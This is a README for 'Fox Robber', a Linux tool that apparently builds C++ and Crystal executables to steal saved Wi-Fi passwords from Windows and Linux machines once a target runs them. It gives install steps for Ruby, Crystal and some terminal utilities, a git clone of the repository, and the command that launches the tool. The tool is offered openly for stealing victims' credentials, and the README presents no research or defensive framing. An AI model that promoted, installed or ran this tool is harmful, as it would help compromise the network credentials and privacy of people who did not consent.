# Fox-Robber
The __Fox Robber__ is a linux tool, so it's means if you want to use this tool, you have to have a ___linux OS___.

The __Fox Robber__ can stealing some data with some executable files. If your target runs one of them, the process begins.

# Install
If you want to use __Fox Robber__ you have to install somethings on your ___linux OS___:

__Install Ruby language:__
---
```
$ sudo apt-get install ruby-full
```
__Install crystal language:__
---
```
$ curl -fsSL https://crystal-lang.org/install.sh | sudo bash
```
```
$ curl -fsSL https://crystal-lang.org/install.sh | sudo bash -s -- --channel=nightly
```
```
$ echo "deb http://download.opensuse.org/repositories/devel:/languages:/crystal/{REPOSITORY}/ /" | tee /etc/apt/sources.list.d/crystal.list
```
```
$ curl -fsSL https://download.opensuse.org/repositories/devel:languages:crystal/{REPOSITORY}/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/crystal.gpg > /dev/null
```
```
$ sudo apt update && sudo apt install crystal
```
```
$ sudo apt install libssl-dev      # for using OpenSSL
$ sudo apt install libxml2-dev     # for using XML
$ sudo apt install libyaml-dev     # for using YAML
$ sudo apt install libgmp-dev      # for using Big numbers
$ sudo apt install libz-dev        # for using crystal play
```
```
$ sudo apt update && sudo apt install crystal
```
__Install some command line:__
---
```
$ sudo apt-get install chafa 
```
```
$ sudo apt-get install espeak
```
```
$ sudo apt-get install lolcat
```
Then you can get the __Fox Robber__:
```
$ git clone https://github.com/Mr-Fox-h/Fox-Robber.git
```
After that use this command to run __Fox Robber tool:
```
$ ruby Fox\ robber.rb
```
# Abilities
__Windows__
---
__Windows Steal WIFI password:__
---

The __Fox Robber__ can make a executable file with __C++ language__ for stealing WIFI‌ passwords for __Windows OS__.

__Linux__
---
__Linux Steal WIFI password:__
---
The __Fox Robber__ can make a executable file with __crystal language__ for stealing WIFI‌ passwords for __Linux OS__.